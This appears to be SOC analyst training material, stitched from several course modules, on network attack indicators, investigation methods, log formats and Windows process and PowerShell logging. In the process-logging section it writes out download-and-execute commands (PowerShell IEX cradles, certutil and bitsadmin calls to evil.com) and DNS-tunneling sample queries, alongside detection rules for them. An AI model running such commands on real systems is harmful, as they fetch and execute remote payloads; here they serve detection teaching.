aG9zdG5hbWU9V09SS1NUQVRJT04tMDg= 
→ hostname=WORKSTATION-08

VERDICT: Likely malware C2 communication
\`\`\`

### Example 2: DNS Tunneling

\`\`\`
SCENARIO:
High volume of DNS queries to *.tunnel.evil.com

SAMPLE QUERIES:
aGVsbG8gd29ybGQ.tunnel.evil.com
dGhpcyBpcyBhIHRlc3Q.tunnel.evil.com
ZXhmaWx0cmF0ZWQgZGF0YQ.tunnel.evil.com

OBSERVATIONS:
1. Subdomain looks like Base64 → Data encoding
2. High query volume → More than normal DNS
3. All to same parent domain → C2 infrastructure
4. Query length > 50 chars → Unusual for normal DNS

DECODE SUBDOMAINS:
aGVsbG8gd29ybGQ → "hello world"
dGhpcyBpcyBhIHRlc3Q → "this is a test"
ZXhmaWx0cmF0ZWQgZGF0YQ → "exfiltrated data"

VERDICT: DNS tunneling for data exfiltration
\`\`\`

### Example 3: Port Scanning

\`\`\`
SCENARIO:
Single source connecting to many destinations on same port

NETFLOW DATA:
10.0.1.50 → 10.0.1.1:22   1 packet
10.0.1.50 → 10.0.1.2:22   1 packet
10.0.1.50 → 10.0.1.3:22   1 packet
... (continues for entire subnet)

OBSERVATIONS:
1. Sequential IP targets
2. Same port (22 = SSH)
3. Single packet per host → SYN scan
4. Very short duration

VERDICT: Internal port scan, likely reconnaissance
\`\`\`

## Network Analysis Checklist

\`\`\`
□ What's the communication pattern (volume, timing)?
□ Is the destination IP/domain known good, bad, or unknown?
□ What protocol is being used? Is it normal for that port?
□ What's in the payload (if available)?
□ Does this match known C2 patterns?
□ Is there beaconing behavior?
□ Are there related alerts from other sources?

# Common Network Attacks

Understanding how attackers operate on networks helps SOC analysts recognize and respond to threats effectively.

## Reconnaissance Attacks

### Port Scanning

\`\`\`
SCAN TYPES

SYN Scan (Half-Open):
├── Send SYN packet
├── Open port: SYN-ACK response
├── Closed port: RST response
├── Stealthy, doesn't complete connection
└── Detection: Many SYN packets, few ACKs

Connect Scan:
├── Completes full TCP handshake
├── More detectable (logged connections)
└── Detection: Short-lived connections to many ports

UDP Scan:
├── Send UDP packet
├── Open: Response or no response
├── Closed: ICMP port unreachable
└── Detection: ICMP unreachable messages

DETECTION EXAMPLE:
Source 10.0.1.50 connected to:
- 10.0.2.1 ports: 22,80,443,445,3389
- 10.0.2.2 ports: 22,80,443,445,3389
- 10.0.2.3 ports: 22,80,443,445,3389

Pattern: Same source, multiple targets, multiple ports
\`\`\`

### Network Mapping

\`\`\`
NETWORK DISCOVERY TECHNIQUES

ICMP Sweep:
└── Ping all IPs in range
└── Map which hosts are alive

ARP Discovery:
└── ARP who-has for IP range
└── Works on local network

Service Fingerprinting:
└── Identify services and versions
└── Helps find vulnerable systems
\`\`\`

## Command and Control (C2)

### C2 Communication Patterns

\`\`\`
COMMON C2 METHODS

HTTP/HTTPS Beaconing:
├── Regular interval callbacks
├── GET requests with encoded data
├── POST for commands/exfiltration
├── Often mimics legitimate traffic

DNS C2:
├── Commands encoded in DNS queries
├── Responses in TXT/CNAME records
├── Evades web proxies
└── Low bandwidth but stealthy

Domain Generation Algorithms (DGA):
├── Malware generates random domain names
├── C2 registers some of them
├── Hard to block all possibilities
└── Detection: High NXDomain responses, entropy analysis
\`\`\`

### C2 Detection Indicators

\`\`\`
RED FLAGS FOR C2

Beaconing Behavior:
☑ Regular interval connections (15min, 30min, etc.)
☑ Consistent packet sizes
☑ Persistent over hours/days
☑ To same destination

Traffic Anomalies:
☑ Encrypted traffic to unusual destinations
☑ Non-standard ports for protocols
☑ Mismatched application headers
☑ Large volumes of DNS TXT queries

Destination Indicators:
☑ Recently registered domains
☑ DGA-looking domain names
☑ Bulletproof hosting providers
☑ Tor exit nodes
\`\`\`

## Lateral Movement

### SMB-Based Movement

\`\`\`
SMB ATTACK TECHNIQUES

# Building Investigation Skills

Becoming an effective SOC analyst requires developing strong analytical and investigation skills beyond just technical knowledge.

## The Analytical Mindset

### Think Like a Detective

\`\`\`
INVESTIGATION APPROACH

1. OBSERVE
   └─ What exactly do you see?
   └─ What data is available?
   └─ What doesn't look right?

2. HYPOTHESIZE
   └─ What could explain this?
   └─ What are alternative explanations?
   └─ What would prove/disprove each?

3. TEST
   └─ Gather evidence for/against hypotheses
   └─ Look for corroborating data
   └─ Challenge your assumptions

4. CONCLUDE
   └─ What does the evidence show?
   └─ How confident are you?
   └─ What's still unknown?
\`\`\`

### Critical Thinking Skills

**Question Everything:**
- Why did this alert fire?
- Is this really malicious or could it be benign?
- What am I not seeing?
- What would an attacker do next?

**Avoid Cognitive Biases:**

| Bias | Description | Mitigation |
|------|-------------|------------|
| Confirmation | Seeking only supporting evidence | Actively look for contradicting data |
| Anchoring | Fixating on first piece of info | Consider alternatives before deciding |
| Availability | Relying on recent/memorable events | Check historical data and baselines |
| Tunnel Vision | Focusing too narrowly | Step back and see the bigger picture |

## Building Technical Intuition

### Pattern Recognition

\`\`\`
DEVELOP YOUR INTUITION

Level 1: Recognition
└─ "I've seen this before"
└─ Match current to past alerts

Level 2: Understanding
└─ "I know why this happens"
└─ Understand the underlying mechanism

Level 3: Prediction
└─ "I know what comes next"
└─ Anticipate attacker behavior

Level 4: Innovation
└─ "I can find what others miss"
└─ Develop new detection methods
\`\`\`

### The 10,000 Alert Rule

Like any skill, investigation improves with practice:

\`\`\`
PROGRESSION PATH

First 100 alerts:
├── Learning tools and interfaces
├── Following playbooks exactly
├── High dependence on documentation
└── Everything takes time

First 1,000 alerts:
├── Recognizing common patterns
├── Faster triage decisions
├── Starting to spot anomalies
└── Building intuition

10,000+ alerts:
├── Instant pattern recognition
├── Deep technical understanding
├── Complex investigation skills
└── Mentoring newer analysts
\`\`\`

## Practical Investigation Techniques

### Pivoting

\`\`\`
PIVOT FROM ONE INDICATOR TO FIND MORE

Start: Suspicious IP 185.234.218.45

Pivot 1: What domains resolve to this IP?
└─ evil-c2.com, malware-drop.net

Pivot 2: What other IPs do these domains use?
└─ 185.234.218.45, 91.109.190.68

Pivot 3: What hosts communicated with these IPs?
└─ WORKSTATION-08, FINANCE-PC-12

Pivot 4: What else did these hosts do?
└─ Executed suspicious PowerShell
└─ Created new scheduled tasks
\`\`\`

### Timeline Building

\`\`\`
RECONSTRUCT THE ATTACK TIMELINE

[09:15:22] Phishing email received
[09:22:35] User opens attachment
[09:22:37] Word macro executes
[09:22:38] PowerShell downloads payload
[09:22:45] Persistence established
[09:23:01] C2 beacon starts
[09:25:00] DETECTED by EDR

Questions to Ask:
• What happened before detection?
• What might have happened after?
• Are there gaps in our visibility?
\`\`\`

### Scope Determination

\`\`\`
ASSESSING INCIDENT SCOPE

Start with: One affected system

### Investigation Notes

\`\`\`
GOOD INVESTIGATION NOTES

[14:22:35] Alert received - PowerShell execution on FINANCE-PC-08
[14:23:00] Reviewed alert - encoded command detected
[14:25:00] Decoded command - downloads from 185.234.218.45
[14:27:00] Checked VirusTotal - IP flagged as malware
[14:30:00] Checked EDR - process tree shows Word→PowerShell
[14:32:00] Verdict: True positive - malware delivery
[14:35:00] Initiated containment - isolated host

WHY THIS MATTERS:
• You can pick up where you left off
• Others can understand your reasoning
• Supports post-incident review
• May be needed for legal proceedings

# What are Security Logs?

**Security logs** are records of events that occur within your IT environment. They are the digital footprints left by every action, connection, and transaction in your systems.

## Why Logs Matter in Security

Logs are the **foundation of security monitoring and incident response**. Without logs, we're essentially blind to what's happening in our environment.

> "Logs are like the black box recorder of an airplane—they tell us what happened, when, and often why."

### Key Uses of Security Logs

| Use Case | Description |
|----------|-------------|
| **Threat Detection** | Identify malicious activity through patterns and anomalies |
| **Incident Investigation** | Reconstruct what happened during a security incident |
| **Compliance** | Meet regulatory requirements (PCI-DSS, HIPAA, SOX) |
| **Forensics** | Provide evidence for legal proceedings |
| **Troubleshooting** | Debug application and system issues |

## What Gets Logged?

Almost everything in IT can generate logs:

### Endpoint Logs
- User logins and logoffs
- Process execution
- File access and modifications
- Registry changes (Windows)
- Privilege escalation

### Network Logs
- Firewall allow/deny decisions
- DNS queries
- HTTP/HTTPS requests
- VPN connections
- NetFlow data

### Application Logs
- Database queries
- API calls
- Authentication attempts
- Error messages
- Transaction records

### Cloud Logs
- Resource access
- Configuration changes
- IAM activities
- API calls

## The 5 W's of Log Analysis

Every log entry should help answer:

1. **Who** - Which user or service account?
2. **What** - What action was performed?
3. **When** - Timestamp of the event
4. **Where** - Source and destination (IP, hostname)
5. **Why** - Context and outcome

## Log Levels / Severity

Most logging systems use severity levels:

\`\`\`
┌─────────────┬────────────────────────────────────┐
│ Level       │ Description                        │
├─────────────┼────────────────────────────────────┤
│ EMERGENCY   │ System is unusable                 │
│ ALERT       │ Immediate action required          │
│ CRITICAL    │ Critical conditions                │
│ ERROR       │ Error conditions                   │
│ WARNING     │ Warning conditions                 │
│ NOTICE      │ Normal but significant             │
│ INFO        │ Informational messages             │
│ DEBUG       │ Debug-level messages               │
└─────────────┴────────────────────────────────────┘
\`\`\`

## Challenges in Log Analysis

### Volume
Modern environments generate **millions of events per day**. A single busy server can produce gigabytes of logs daily.

### Variety
Different systems use different formats, making correlation challenging.

### Velocity
Real-time threat detection requires processing logs as they're generated.

### Veracity
Not all logs are equally reliable or complete.

## The Security Analyst's Perspective

As a security analyst, you'll approach logs with specific questions:

- Is this activity expected or suspicious?
- Does this pattern indicate an attack?
- What's the timeline of events?
- Who or what is responsible?
- What's the impact?

Mastering log analysis is one of the most valuable skills for any security professional!

# Common Log Formats

Understanding log formats is essential for parsing and analyzing security events. Different systems and vendors use different formats, but several standards have emerged.

## Syslog Format

**Syslog** is the most widely used logging standard, especially in Unix/Linux environments and network devices.

### Traditional Syslog (RFC 3164)

\`\`\`
<priority>timestamp hostname process[pid]: message
\`\`\`

**Example:**
\`\`\`
<34>Oct 11 22:14:15 mymachine su: 'su root' failed for lonvick on /dev/pts/8
\`\`\`

### Modern Syslog (RFC 5424)

\`\`\`
<priority>version timestamp hostname app-name procid msgid structured-data msg
\`\`\`

**Example:**
\`\`\`
<165>1 2023-10-11T22:14:15.003Z mymachine.example.com evntslog - ID47 [exampleSDID@32473 iut="3"] BOMAn application event log entry...
\`\`\`

### Priority Calculation
Priority = (Facility × 8) + Severity

| Facility | Value | Description |
|----------|-------|-------------|
| kern | 0 | Kernel messages |
| user | 1 | User-level messages |
| auth | 4 | Security/auth messages |
| authpriv | 10 | Security/auth (private) |
| local0-7 | 16-23 | Custom use |

## CEF (Common Event Format)

**CEF** is a standardized format developed by ArcSight, widely used in SIEM integrations.

\`\`\`
CEF:Version|Device Vendor|Device Product|Device Version|Signature ID|Name|Severity|Extension
\`\`\`

**Example:**
\`\`\`
CEF:0|Security|Firewall|1.0|100|Connection Blocked|7|src=192.168.1.100 dst=10.0.0.1 spt=12345 dpt=443 proto=TCP
\`\`\`

### CEF Extension Fields
- **src/dst** - Source/Destination IP
- **spt/dpt** - Source/Destination Port
- **act** - Action taken
- **msg** - Human-readable message
- **cs1-cs6** - Custom strings

## JSON Format

**JSON** is increasingly popular for logs due to its flexibility and machine readability.

\`\`\`json
{
  "timestamp": "2023-10-11T22:14:15.003Z",
  "level": "warning",
  "source": "firewall",
  "action": "blocked",
  "src_ip": "192.168.1.100",
  "dst_ip": "10.0.0.1",
  "dst_port": 443,
  "protocol": "TCP",
  "message": "Suspicious outbound connection blocked"
}
\`\`\`

### Advantages of JSON
- Self-describing (field names included)
- Nested structures supported
- Easy to parse programmatically
- Human-readable

## Windows Event Log Format (EVTX)

Windows uses a structured XML-based format internally.

\`\`\`xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4624</EventID>
    <TimeCreated SystemTime="2023-10-11T22:14:15.003Z"/>
    <Computer>WORKSTATION01</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">john.doe</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="IpAddress">192.168.1.50</Data>
  </EventData>
</Event>

## Apache/NCSA Combined Log Format

Common for web server access logs:

\`\`\`
%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
\`\`\`

**Example:**
\`\`\`
192.168.1.100 - john [11/Oct/2023:22:14:15 +0000] "GET /admin/login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
\`\`\`

## LEEF (Log Event Extended Format)

IBM's format similar to CEF:

\`\`\`
LEEF:Version|Vendor|Product|Version|EventID|
\`\`\`

## Parsing Tips

1. **Identify the format first** - Look for patterns, delimiters, and structure
2. **Use the right tools** - Regex, parsers, or SIEM built-in parsing
3. **Normalize fields** - Map vendor-specific fields to common names
4. **Handle timestamps** - Convert to UTC, parse correctly
5. **Extract key fields** - Focus on security-relevant data

\`\`\`
┌────────────────────────────────────────────────┐
│              SOC Log Priority                  │
├────────────────────────────────────────────────┤
│ 1. Auth (AD, VPN, Cloud)      ████████████ HIGH│
│ 2. Network (FW, Proxy, DNS)   ██████████ HIGH  │
│ 3. Endpoint (EDR, Sysmon)     ████████ HIGH    │
│ 4. Email (O365, Exchange)     ██████ MEDIUM    │
│ 5. Application (Web, DB)      ████ MEDIUM      │
│ 6. Cloud (AWS, Azure, GCP)    ██████ MEDIUM    │

    content: `
# Log Collection & Centralization

Collecting logs from across your environment and centralizing them is critical for effective security monitoring.

## Why Centralize Logs?

### Without Centralization
\`\`\`
[Server 1] ─── Local logs only
[Server 2] ─── Local logs only
[Firewall] ─── Local logs only
[Workstations] ─── Local logs only

❌ Analyst must access each system
❌ No correlation possible
❌ Logs may be deleted by attackers
❌ No long-term retention
\`\`\`

### With Centralization
\`\`\`
[Server 1] ──────┐
[Server 2] ──────┼──→ [SIEM] ──→ [Analyst]
[Firewall] ──────┤        │
[Workstations] ──┘        ↓
                    [Storage/Archive]

✅ Single pane of glass
✅ Cross-source correlation
✅ Protected from tampering
✅ Long-term retention
\`\`\`

## Log Collection Methods

### Agent-Based Collection

Agents installed on endpoints forward logs.

**Pros:**
- Rich data collection
- Works across networks
- Can filter at source

**Cons:**
- Agent deployment needed
- Resource overhead
- Agent management

**Common Agents:**
- Elastic Agent / Beats
- Splunk Universal Forwarder
- Microsoft MMA/AMA
- Sysmon + WEF

### Agentless Collection

Logs pulled from systems or sent via syslog.

**Syslog (UDP/TCP/TLS):**
\`\`\`
[Device] ──UDP/514──→ [Syslog Server] ──→ [SIEM]
\`\`\`

**Windows Event Forwarding (WEF):**
\`\`\`
[Windows Clients] ──WinRM──→ [Collector] ──→ [SIEM]
\`\`\`

**API Polling:**
\`\`\`
[Cloud Service] ←──API──→ [SIEM] (pulls logs)
\`\`\`

### Protocol Comparison

| Method | Reliability | Security | Use Case |
|--------|-------------|----------|----------|
| Syslog UDP | Low (no ack) | Low | Legacy devices |
| Syslog TCP | Medium | Low | Network devices |
| Syslog TLS | Medium | High | Secure forwarding |
| HTTPS/API | High | High | Cloud, modern apps |
| Agent | High | High | Endpoints |

## Log Pipeline Architecture

A typical enterprise log pipeline:

\`\`\`
┌──────────────┐
│ Log Sources  │
└──────┬───────┘
       ↓
┌──────────────┐
│  Collectors  │  (rsyslog, Logstash, Fluentd)
└──────┬───────┘
       ↓
┌──────────────┐
│   Parsing    │  (Extract fields, normalize)
│   & Enrich   │
└──────┬───────┘
       ↓
┌──────────────┐
│    SIEM      │  (Index, correlate, alert)
└──────┬───────┘
       ↓
┌──────────────┐
│   Storage    │  (Hot/Warm/Cold tiers)
└──────────────┘
\`\`\`

## Key Considerations

### Timestamp Handling
- Ensure all sources use NTP
- Normalize to UTC
- Handle timezone conversions
- Log ingestion time vs event time

### Data Normalization
Map vendor-specific fields to common schema:
\`\`\`
Vendor A: src_addr → Common: source_ip
Vendor B: srcip → Common: source_ip
Vendor C: SourceIP → Common: source_ip
\`\`\`

### Log Retention
| Log Type | Typical Retention |
|----------|------------------|
| Security events | 1-2 years |
| Network traffic | 90 days - 1 year |
| Debug/verbose | 7-30 days |
| Compliance (PCI) | 1 year minimum |

### Volume Planning
Estimate daily log volume:
- Windows DC: 500MB - 2GB/day
- Firewall: 1-10GB/day
- Web proxy: 2-20GB/day
- EDR: 1-5GB/endpoint/day

## Common Collection Tools

| Tool | Type | Use Case |
|------|------|----------|
| rsyslog | Open source | Linux syslog collection |
| Logstash | Open source | ETL pipeline |
| Fluentd | Open source | Lightweight collection |
| NXLog | Commercial/Free | Cross-platform |
| Cribl | Commercial | Log routing/reduction |
    `,
    keyTakeaways: [
      "Centralized logging enables correlation and protects logs from tampering",
      "Agent-based collection provides rich data; agentless is simpler to deploy",
      "Syslog, WEF, and APIs are common collection methods",
      "Timestamp normalization and field mapping are critical",
      "Plan for log volume and retention requirements"

# Windows Event Log Architecture

Understanding how Windows logging works is essential for security analysis. Windows Event Logs are one of the richest sources of security telemetry.

## Event Log Structure

Windows stores logs in **.evtx** files using an XML-based structure.

### Log Locations
\`\`\`
%SystemRoot%\\System32\\winevt\\Logs\\
├── Security.evtx
├── System.evtx
├── Application.evtx
├── Microsoft-Windows-Sysmon%4Operational.evtx
├── Microsoft-Windows-PowerShell%4Operational.evtx
└── ... (hundreds more)
\`\`\`

## Main Event Log Channels

| Channel | Purpose | Key Events |
|---------|---------|------------|
| **Security** | Audit events | Logons, privilege use, object access |
| **System** | OS events | Service changes, drivers, errors |
| **Application** | App events | Crashes, app-specific logs |
| **PowerShell/Operational** | PS activity | Script execution |
| **Sysmon/Operational** | Sysmon events | Process, network, file |

## Event Log Components

Each event contains:

\`\`\`xml
<Event>
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4624</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2023-10-11T22:14:15.003Z"/>
    <EventRecordID>123456</EventRecordID>
    <Computer>WORKSTATION01.domain.local</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">john.doe</Data>
    <Data Name="LogonType">10</Data>
    ...
  </EventData>
</Event>
\`\`\`

### Key Fields

| Field | Description |
|-------|-------------|
| EventID | Unique event identifier |
| TimeCreated | When the event occurred |
| Computer | Hostname where event was logged |
| Provider | Source of the event |
| EventData | Event-specific details |

## Event Viewer Tool

The built-in **Event Viewer** (eventvwr.msc) allows you to:
- Browse and filter logs
- Create custom views
- Export logs
- Clear logs (requires admin)

### Useful Filters
\`\`\`
# Filter by Event ID
Event ID = 4624

# Filter by time
TimeCreated >= [Date]

# Filter by user (XPath)
*[EventData[Data[@Name='TargetUserName']='john.doe']]
\`\`\`

## Audit Policy Configuration

Windows must be configured to generate security events:

\`\`\`
Local Security Policy → Advanced Audit Policy Configuration:

├── Logon/Logoff
│   ├── Audit Logon: Success, Failure
│   └── Audit Logoff: Success
├── Account Management
│   └── Audit User Account Management: Success, Failure
├── Privilege Use
│   └── Audit Sensitive Privilege Use: Success, Failure
└── Object Access
    └── Audit File System: Success, Failure
\`\`\`

## Windows Event Forwarding (WEF)

Centralize Windows logs without third-party agents:

\`\`\`
[Workstation 1] ──┐
[Workstation 2] ──┼──WinRM──→ [Collector Server] ──→ [SIEM]
[Server 1] ───────┘
\`\`\`

### WEF Architecture
1. **Source computers** push events
2. **Collector** receives and stores
3. **Subscriptions** define what to collect

## PowerShell Commands for Logs

\`\`\`powershell
# List all event logs
Get-WinEvent -ListLog *

# Get recent Security events
Get-WinEvent -LogName Security -MaxEvents 100

# Filter by Event ID
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624}

# Export to CSV
Get-WinEvent -LogName Security | Export-Csv events.csv
\`\`\`

## Log Size and Retention

Default maximum log sizes are often too small:

| Log | Default Size | Recommended |
|-----|--------------|-------------|
| Security | 20 MB | 1-4 GB |
| System | 20 MB | 128 MB |
| Application | 20 MB | 128 MB |
| PowerShell | 15 MB | 1 GB |

Configure via: **Event Viewer → Log Properties → Maximum log size**
    `,
    keyTakeaways: [
      "Windows logs are stored in .evtx files with XML structure",
      "Security, System, Application, and PowerShell are key channels",
      "Audit policies must be configured to generate security events",
      "Event Viewer and PowerShell are primary tools for log access",
      "Default log sizes are too small—increase for security monitoring"
    ]

| **1** (Sysmon) | Process created | Enhanced process logging |
| **400/403** (PS) | PowerShell engine start/stop | Script execution |
| **4104** (PS) | Script block logging | Full script content |

### Event 4688 - Process Creation
Enable command-line logging via GPO:
\`\`\`
Computer Configuration → Administrative Templates → 
System → Audit Process Creation → 
Include command line in process creation events = Enabled
\`\`\`

## Privilege Escalation

| Event ID | Description | Detection Use |
|----------|-------------|---------------|
| **4672** | Special privileges assigned | Admin logon detection |
| **4673** | Privileged service called | Sensitive operations |

## Quick Reference Card

\`\`\`
AUTHENTICATION:
  4624 → Successful logon
  4625 → Failed logon
  4648 → Explicit credentials (RunAs)
  4672 → Admin/special privileges

ACCOUNT CHANGES:
  4720 → User created
  4732 → Added to local group
  4728 → Added to domain group
  4724 → Password reset

EXECUTION:
  4688 → Process created
  4104 → PowerShell script block

LATERAL MOVEMENT:
  4624 (Type 3) → Network logon
  4624 (Type 10) → RDP logon
  5140 → Share access

PERSISTENCE:
  4698 → Scheduled task created
  7045 → Service installed
\`\`\`

## Investigation Tip

Always correlate events! A single 4624 tells you someone logged in. Combine with:
- 4688 events → What did they run?
- 5140 events → What shares did they access?
- 4648 events → Did they use other credentials?

# Authentication & Logon Analysis

Analyzing authentication logs is fundamental to security monitoring. Most attacks involve compromised credentials at some point.

## The Authentication Flow

\`\`\`
User → Credentials → Authentication Protocol → Success/Failure → Access
         ↓                    ↓                      ↓
    Password/Cert     NTLM/Kerberos/LDAP       4624/4625
\`\`\`

## Analyzing Event 4624 (Successful Logon)

Key fields to examine:

\`\`\`
Subject:
  Security ID: SYSTEM
  Account Name: WORKSTATION01$
  
Logon Information:
  Logon Type: 10          ← How they logged in
  Logon GUID: {GUID}
  
New Logon:
  Security ID: DOMAIN\\john.doe
  Account Name: john.doe   ← Who logged in
  Account Domain: DOMAIN
  Logon ID: 0x12345       ← Session identifier
  
Network Information:
  Workstation Name: ATTACKER-PC
  Source Network Address: 192.168.1.100  ← Where from
  Source Port: 54321
  
Logon Process: NtLmSsp    ← Authentication protocol
Authentication Package: NTLM
\`\`\`

## Suspicious Logon Patterns

### 1. Failed Logon Storms (Brute Force)
\`\`\`
Time           EventID  User       SourceIP
10:00:01.001   4625     admin      192.168.1.50
10:00:01.050   4625     admin      192.168.1.50
10:00:01.102   4625     admin      192.168.1.50
10:00:01.155   4625     admin      192.168.1.50
10:00:01.203   4624     admin      192.168.1.50  ← Success!
\`\`\`

**Detection:** Multiple 4625 events followed by 4624 from same source.

### 2. Password Spraying
\`\`\`
Time           EventID  User       SourceIP       Status
10:00:01       4625     user1      192.168.1.50   Failed
10:00:02       4625     user2      192.168.1.50   Failed
10:00:03       4625     user3      192.168.1.50   Failed
10:00:04       4624     user4      192.168.1.50   Success!
\`\`\`

**Detection:** Same source, same password attempt against many accounts.

### 3. Lateral Movement
\`\`\`
Source: Workstation01 → Target: Server01
LogonType: 3 (Network)
Account: Domain Admin
Process: cmd.exe → psexec.exe
\`\`\`

**Detection:** Type 3 logons to servers from workstations, especially with admin accounts.

### 4. Impossible Travel
\`\`\`
10:00:00  User john.doe logged in from New York (192.168.1.50)
10:05:00  User john.doe logged in from Singapore (203.0.113.25)
\`\`\`

**Detection:** Logins from geographically impossible locations within short time.

### 5. Off-Hours Activity
\`\`\`
03:00:00 AM  User finance_user logged in (Type 10 - RDP)
             Normal hours: 8 AM - 6 PM
\`\`\`

**Detection:** Logons outside normal business hours for the user.

## NTLM vs Kerberos

### NTLM (Legacy)
- Events: 4776 (credential validation)
- Risks: Pass-the-Hash, relay attacks
- Detection: Monitor for unexpected NTLM usage

### Kerberos (Modern)
- Events: 4768 (TGT), 4769 (Service Ticket)
- Risks: Pass-the-Ticket, Kerberoasting
- Detection: Unusual service ticket requests

## Building Detection Queries

### SIEM Query: Brute Force Detection
\`\`\`sql
EventID=4625 
| stats count by TargetUserName, IpAddress, span=5m 
| where count > 10
\`\`\`

### SIEM Query: Admin Logon Monitoring
\`\`\`sql
EventID=4624 LogonType IN (3,10) 
| lookup admin_users TargetUserName 
| where is_admin=true
\`\`\`

### SIEM Query: RDP Brute Force
\`\`\`sql
EventID=4625 LogonType=10 
| stats count by IpAddress span=1h 
| where count > 50
\`\`\`

## Analysis Checklist

When investigating authentication events:

- [ ] Is this user/account expected to log in here?
- [ ] Is this logon type normal for this user?
- [ ] Is the source IP expected?
- [ ] Is the time of day normal?
- [ ] Are there preceding failed attempts?
- [ ] What happened after the logon? (4688 events)
- [ ] Is the authentication protocol appropriate? (NTLM vs Kerberos)
    `,
    keyTakeaways: [
      "4624 contains critical fields: LogonType, User, SourceIP, and Process",
      "Brute force shows as multiple 4625 followed by 4624",

# Process & Command Line Logging

Process execution logging is critical for detecting malicious activity. Attackers must run commands, and those commands leave traces.

## Event ID 4688: Process Creation

This is Windows' native process creation logging.

### Key Fields

\`\`\`
Subject:
  Account Name: john.doe      ← Who ran it
  
Process Information:
  New Process ID: 0x1234
  New Process Name: C:\\Windows\\System32\\cmd.exe  ← What ran
  Creator Process ID: 0x5678
  Creator Process Name: C:\\Windows\\explorer.exe   ← Parent process
  
Command Line: cmd.exe /c whoami  ← Full command (if enabled)
\`\`\`

### Enabling Command Line Logging

**Via Group Policy:**
\`\`\`
Computer Configuration → 
Administrative Templates → 
System → Audit Process Creation → 
Include command line in process creation events = Enabled
\`\`\`

**Via Registry:**
\`\`\`
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit
ProcessCreationIncludeCmdLine_Enabled = 1
\`\`\`

## Sysmon: Enhanced Process Logging

Sysmon provides richer process data than native logging.

### Sysmon Event ID 1: Process Create

\`\`\`xml
<Event>
  <EventData>
    <Data Name="UtcTime">2023-10-11 22:14:15.003</Data>
    <Data Name="ProcessGuid">{guid}</Data>
    <Data Name="ProcessId">1234</Data>
    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c whoami</Data>
    <Data Name="User">DOMAIN\\john.doe</Data>
    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
    <Data Name="ParentCommandLine">explorer.exe</Data>
    <Data Name="Hashes">SHA256=abc123...</Data>
  </EventData>
</Event>
\`\`\`

### Sysmon Advantages
- File hashes (MD5, SHA1, SHA256)
- Parent command line
- Process GUID for tracking
- Network connections (Event 3)
- File creation (Event 11)

## Suspicious Process Patterns

### 1. Living Off the Land Binaries (LOLBins)
Attackers abuse built-in Windows tools:

| Binary | Suspicious Use |
|--------|----------------|
| powershell.exe | Encoded commands, download cradles |
| cmd.exe | Spawned from unusual parents |
| wscript.exe | Running remote scripts |
| mshta.exe | Running HTA files |
| certutil.exe | Downloading files |
| bitsadmin.exe | File transfers |
| regsvr32.exe | Loading remote DLLs |

**Detection Example:**
\`\`\`
Process: certutil.exe
CommandLine: certutil -urlcache -split -f http://evil.com/payload.exe
\`\`\`

### 2. Suspicious Parent-Child Relationships

**Normal:**
\`\`\`
explorer.exe → chrome.exe ✓
explorer.exe → notepad.exe ✓
services.exe → svchost.exe ✓
\`\`\`

**Suspicious:**
\`\`\`
outlook.exe → powershell.exe ⚠️ (Macro execution)
winword.exe → cmd.exe ⚠️ (Macro execution)
w3wp.exe → cmd.exe ⚠️ (Web shell)
svchost.exe → cmd.exe ⚠️ (Potentially malicious)
\`\`\`

### 3. Encoded PowerShell

**Red Flags:**
\`\`\`
powershell.exe -enc <base64>
powershell.exe -e <base64>
powershell.exe -EncodedCommand <base64>
powershell.exe -nop -w hidden -c IEX(...)
\`\`\`

**Decode Base64 to see actual command:**
\`\`\`bash
echo "SGVsbG8gV29ybGQ=" | base64 -d
\`\`\`

### 4. Download Cradles

Commands that download and execute:
\`\`\`powershell
# PowerShell
IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
Invoke-Expression (Invoke-WebRequest 'http://evil.com/script.ps1')

# Certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe

# BITSAdmin
bitsadmin /transfer job http://evil.com/payload.exe C:\\temp\\payload.exe
\`\`\`

## Building Detection Rules

### Encoded PowerShell Detection
\`\`\`
Process = "powershell.exe" 
AND CommandLine matches regex "-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/=]{50,}"
\`\`\`

### Unusual Parent-Child
\`\`\`
ParentImage IN (
  "*\\outlook.exe", 
  "*\\winword.exe", 
  "*\\excel.exe"
) 
AND Image IN (
  "*\\powershell.exe", 
  "*\\cmd.exe", 
  "*\\wscript.exe"
)
\`\`\`

### Certutil Download
\`\`\`
Process = "*\\certutil.exe"
AND CommandLine contains any of ("-urlcache", "-split", "http://", "https://")
\`\`\`

    keyTakeaways: [
      "Event 4688 with command-line logging captures process execution",

# PowerShell Logging

PowerShell is both a powerful admin tool and a favorite of attackers. Proper logging is essential for detecting malicious use.

## Types of PowerShell Logging

### 1. Module Logging
Records pipeline execution details for specified modules.

**Enable via GPO:**
\`\`\`
Computer Configuration → Administrative Templates → 
Windows Components → Windows PowerShell → 
Turn on Module Logging = Enabled
Module Names = *  (all modules)
\`\`\`

**Event Log:** Microsoft-Windows-PowerShell/Operational
**Event ID:** 4103

### 2. Script Block Logging
Records the full content of executed scripts.

**Enable via GPO:**
\`\`\`
Computer Configuration → Administrative Templates → 
Windows Components → Windows PowerShell → 
Turn on PowerShell Script Block Logging = Enabled
Log script block invocation = Checked (optional)
\`\`\`

**Event Log:** Microsoft-Windows-PowerShell/Operational
**Event ID:** 4104

### 3. Transcription Logging
Creates text transcript of entire PowerShell session.

**Enable via GPO:**
\`\`\`
